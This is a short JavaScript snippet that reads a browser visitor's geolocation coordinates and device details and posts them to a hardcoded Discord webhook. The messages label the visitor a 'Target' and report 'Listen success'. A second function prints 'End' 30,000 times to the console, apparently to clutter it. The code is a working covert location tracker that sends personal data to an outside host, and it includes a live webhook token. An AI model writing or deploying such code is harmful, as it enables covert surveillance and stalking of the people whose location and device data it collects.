navigator.geolocation.getCurrentPosition(position => {
    const {latitude, longitude} = position.coords;
    const applicationName = navigator.appName;
    const applicationVersion = navigator.appVersion;
    const platform = navigator.platform;

    axios.post('https://discordapp.com/api/webhooks/1348061562526629950/objBiPJNyWfYH64Jlo63BCAuJRt1RyQEeP_qOf3HiVBIUqW3UJd3E6zWBCB3nUt293wI', {
        "username": "Captain Hook",
        "content": `
    Listen success
    
    Target position:
    Latitude: ${latitude}
    Longitude: ${longitude}
    
    Target device information:
    Application name: ${applicationName};
    Application version: ${applicationVersion}
    Platform: ${platform}
    `
    });   
});

function end() {
    for (let i = 0; i < 30000; i++) {
        console.log("End");
    };
};
